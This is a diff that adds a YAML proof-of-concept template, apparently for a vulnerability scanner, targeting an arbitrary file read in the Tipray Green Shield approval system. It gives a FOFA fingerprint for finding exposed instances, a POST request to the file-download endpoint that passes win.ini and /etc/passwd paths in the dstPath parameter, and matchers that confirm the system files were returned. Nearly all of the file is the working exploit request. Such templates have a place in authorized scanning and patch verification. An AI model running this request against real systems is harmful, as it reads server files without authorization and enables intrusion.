@@ -1,0 +1,37 @@
+id: poc-yaml-tipray-gsas-file-anyfile-read
+info:
+  name: 天锐绿盾审批系统 file 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  paths: 'C:/windows/win.ini
+
+    etc/passwd
+
+    '
+requests:
+- method: POST
+  path: /trwfe/file/downFileByconfirm.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: dstPath={{.paths}}&fileName=1.png&processInstanceIds=
+  expression: '(status_code == 200 && contains(content_type,"application/force-download")
+    && contains(headers,"filename=") && !contains(body,"<"))
+
+    &&
+
+    (
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    ||
+
+    (contains(body,"[files]") && contains(body,"bit app support"))
+
+    )
+
+    '
+transport: http
